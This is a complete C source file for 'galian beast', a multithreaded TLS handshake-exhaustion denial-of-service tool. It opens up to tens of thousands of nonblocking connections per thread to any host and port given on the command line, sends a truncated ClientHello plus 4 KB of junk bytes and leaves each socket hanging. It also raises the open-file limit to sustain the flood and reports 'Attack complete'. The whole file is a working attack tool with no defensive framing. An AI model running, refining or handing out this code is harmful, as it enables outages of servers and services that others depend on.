// gcc -O2 -o gbeast galian_beast.c -lssl -lcrypto -lpthread

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <stdatomic.h>

#define DESIRED_NOFILE 1000000000UL  // Adjust as necessary for your system
#define BATCH_SIZE 256            // Number of connections created per batch in each thread
#define MAX_EVENTS 4096           // Maximum events returned by epoll_wait

#define BANNER "\n\033[1;31m" \
"                            ,-.\n" \
"       ___,---.__          /'|`\          __,---,___\n" \
"    ,-'    \\`    `-.____,-'  |  `-.____,-'    //    `-.\n" \
"  ,'        |           ~'\\     /`~           |        `.\n" \
" /      ___//              `. ,'          ,  , \\___      \n" \
"|    ,-'   `-.__   _         |        ,    __,-'   `-.    |\n" \
"|   /          /\\_  `   .    |    ,      _/\\          \\   |\n" \
"\\  |           \\ \\`-.___ \\   |   / ___,-'/ /           |  /\\\n" \
" \\  \\           | `._   `\\\\  |  //'   _,' |           /  /\\\n" \
"  `-.\\         /'  _ `---'' , . ``---' _  `\\         /,-'\n" \
"     ``       /     \\    ,='/ \\`=.    /     \\       ''\n" \
"\033[0m                * g a l i a n    b e a s t *\n\n"

// Partial TLS ClientHello payload (record header and handshake header)
static const unsigned char clientHello[] = {
    0x16, 0x03, 0x01, 0xFF, 0xFF,
    0x01, 0x00, 0xFF, 0xFF
};
#define CLIENTHELLO_SIZE sizeof(clientHello)

// Junk data to be sent after the partial ClientHello
static const unsigned char junkData[4096] = { 0 };
#define JUNK_SIZE sizeof(junkData)

// Global atomic counters for statistics
atomic_long total_connections = ATOMIC_VAR_INIT(0);
atomic_long pending_handshakes = ATOMIC_VAR_INIT(0);
atomic_int finished_threads = ATOMIC_VAR_INIT(0);

// Global target address (supports IPv4/IPv6)
struct sockaddr_storage target_addr;
socklen_t target_addr_len;

// Resolve target host using getaddrinfo
void resolve_target(const char *host, const char *port_str) {
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;      // Allow IPv4 or IPv6
    hints.ai_socktype = SOCK_STREAM;
    int ret = getaddrinfo(host, port_str, &hints, &res);
    if (ret != 0) {
        fprintf(stderr, "Error in getaddrinfo: %s\n", gai_strerror(ret));
        exit(EXIT_FAILURE);
    }
    memcpy(&target_addr, res->ai_addr, res->ai_addrlen);
    target_addr_len = res->ai_addrlen;
    freeaddrinfo(res);
}

// Set a file descriptor to nonblocking mode
int set_nonblocking(int fd) {
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags == -1)
        return -1;
    return fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

// Connection state for the nonblocking state machine
typedef enum { STATE_CONNECTING, STATE_CLIENTHELLO, STATE_JUNK, STATE_DONE } conn_state_t;

typedef struct {
    int fd;
    conn_state_t state;
    size_t sent_bytes; // Amount sent in current payload
} connection_t;

// Thread configuration: each thread creates a fixed number of connections
typedef struct {
    int thread_id;
    long max_connections;  // Maximum connections to create in this thread
} ThreadConfig;

// Worker thread function employing epoll for asynchronous connection and data send
void *worker_thread(void *arg) {
    ThreadConfig *config = (ThreadConfig *) arg;
    int epoll_fd = epoll_create1(0);
    if (epoll_fd == -1) {
        perror("epoll_create1");
        pthread_exit(NULL);
    }
    
    struct epoll_event events[MAX_EVENTS];
    long created = 0;
    
    // Loop until the thread has created the desired number of connections
    while (created < config->max_connections) {
        // Create a batch of connections
        for (int i = 0; i < BATCH_SIZE && created < config->max_connections; i++) {
            int sock = socket(target_addr.ss_family, SOCK_STREAM, 0);
            if (sock < 0)
                continue;
            if (set_nonblocking(sock) == -1) {
                close(sock);
                continue;
            }
            int ret = connect(sock, (struct sockaddr *)&target_addr, target_addr_len);
            if (ret < 0 && errno != EINPROGRESS) {
                close(sock);
                continue;
            }
            connection_t *conn = malloc(sizeof(connection_t));
            if (!conn) {
                close(sock);
                continue;
            }
            conn->fd = sock;
            conn->state = STATE_CONNECTING;
            conn->sent_bytes = 0;
            
            struct epoll_event ev;
            ev.events = EPOLLOUT | EPOLLET;  // Edge-triggered output events
            ev.data.ptr = conn;
            if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, sock, &ev) == -1) {
                close(sock);
                free(conn);
                continue;
            }
            created++;
            atomic_fetch_add(&total_connections, 1);
        }
        
        // Process epoll events with a short timeout
        int nfds = epoll_wait(epoll_fd, events, MAX_EVENTS, 100);
        for (int i = 0; i < nfds; i++) {
            connection_t *conn = (connection_t *) events[i].data.ptr;
            // STATE_CONNECTING: Check if connection completed
            if (conn->state == STATE_CONNECTING) {
                int err = 0;
                socklen_t len = sizeof(err);
                if (getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &len) < 0 || err != 0) {
                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
                    close(conn->fd);
                    free(conn);
                    continue;
                }
                conn->state = STATE_CLIENTHELLO;
                conn->sent_bytes = 0;
            }
            // STATE_CLIENTHELLO: Send the partial ClientHello header
            if (conn->state == STATE_CLIENTHELLO) {
                ssize_t n = send(conn->fd, clientHello + conn->sent_bytes, CLIENTHELLO_SIZE - conn->sent_bytes, 0);
                if (n > 0) {
                    conn->sent_bytes += n;
                    if (conn->sent_bytes == CLIENTHELLO_SIZE) {
                        conn->state = STATE_JUNK;
                        conn->sent_bytes = 0;
                    }
                } else if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
                    close(conn->fd);
                    free(conn);
                    continue;
                }
            }
            // STATE_JUNK: Send additional junk data to hold the handshake pending
            if (conn->state == STATE_JUNK) {
                ssize_t n = send(conn->fd, junkData + conn->sent_bytes, JUNK_SIZE - conn->sent_bytes, 0);
                if (n > 0) {
                    conn->sent_bytes += n;
                    if (conn->sent_bytes == JUNK_SIZE) {
                        conn->state = STATE_DONE;
                        atomic_fetch_add(&pending_handshakes, 1);
                        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
                        // Leave socket open to maintain pending handshake; free tracking structure
                        free(conn);
                        continue;
                    }
                } else if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
                    close(conn->fd);
                    free(conn);
                    continue;
                }
            }
        }
    }
    
    // Process any remaining events until no more are pending
    while (1) {
        int nfds = epoll_wait(epoll_fd, events, MAX_EVENTS, 100);
        if (nfds <= 0)
            break;
        for (int i = 0; i < nfds; i++) {
            connection_t *conn = (connection_t *) events[i].data.ptr;
            if (conn->state == STATE_CONNECTING) {
                int err = 0;
                socklen_t len = sizeof(err);
                if (getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &len) < 0 || err != 0) {
                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
                    close(conn->fd);
                    free(conn);
                    continue;
                }
                conn->state = STATE_CLIENTHELLO;
                conn->sent_bytes = 0;
            }
            if (conn->state == STATE_CLIENTHELLO) {
                ssize_t n = send(conn->fd, clientHello + conn->sent_bytes, CLIENTHELLO_SIZE - conn->sent_bytes, 0);
                if (n > 0) {
                    conn->sent_bytes += n;
                    if (conn->sent_bytes == CLIENTHELLO_SIZE) {
                        conn->state = STATE_JUNK;
                        conn->sent_bytes = 0;
                    }
                } else if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
                    close(conn->fd);
                    free(conn);
                    continue;
                }
            }
            if (conn->state == STATE_JUNK) {
                ssize_t n = send(conn->fd, junkData + conn->sent_bytes, JUNK_SIZE - conn->sent_bytes, 0);
                if (n > 0) {
                    conn->sent_bytes += n;
                    if (conn->sent_bytes == JUNK_SIZE) {
                        conn->state = STATE_DONE;
                        atomic_fetch_add(&pending_handshakes, 1);
                        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
                        free(conn);
                        continue;
                    }
                } else if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
                    close(conn->fd);
                    free(conn);
                    continue;
                }
            }
        }
    }
    
    close(epoll_fd);
    atomic_fetch_add(&finished_threads, 1);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    printf(BANNER);
    
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <IP/HOST> <PORT> <THREADS> [max_connections_per_thread]\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    // Adjust open file descriptor limit
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        unsigned long target = DESIRED_NOFILE;
        if (target > rl.rlim_max)
            target = rl.rlim_max;
        while (target > rl.rlim_cur) {
            rl.rlim_cur = target;
            if (setrlimit(RLIMIT_NOFILE, &rl) == 0) {
                printf("[*] Open file descriptor limit set to %lu\n", target);
                break;
            } else {
                perror("setrlimit failed");
                target /= 2;
            }
        }
    } else {
        perror("getrlimit failed");
    }
    
    // Resolve target host and port
    resolve_target(argv[1], argv[2]);
    
    int thread_count = atoi(argv[3]);
    long max_conn_per_thread = 50000;
    if (argc >= 5) {
        max_conn_per_thread = atol(argv[4]);
    }
    
    pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
    ThreadConfig *configs = malloc(thread_count * sizeof(ThreadConfig));
    if (!threads || !configs) {
        perror("Memory allocation failed");
        return EXIT_FAILURE;
    }
    
    // Create worker threads
    for (int i = 0; i < thread_count; i++) {
        configs[i].thread_id = i;
        configs[i].max_connections = max_conn_per_thread;
        if (pthread_create(&threads[i], NULL, worker_thread, &configs[i]) != 0) {
            perror("Thread creation failed");
        }
    }
    
    // Continuous feedback loop with original blue-colored stats output
    while (atomic_load(&finished_threads) < thread_count) {
        printf("\r\033[34m[+] Total Connections: %ld | Pending Handshakes: %ld | Threads: %d\033[0m",
               atomic_load(&total_connections),
               atomic_load(&pending_handshakes),
               thread_count);
        fflush(stdout);
        sleep(1);
    }
    
    for (int i = 0; i < thread_count; i++)
        pthread_join(threads[i], NULL);
    
    printf("\n\033[32m[+] Attack complete: all connections are pending!\033[0m\n");
    free(threads);
    free(configs);
    return EXIT_SUCCESS;
}
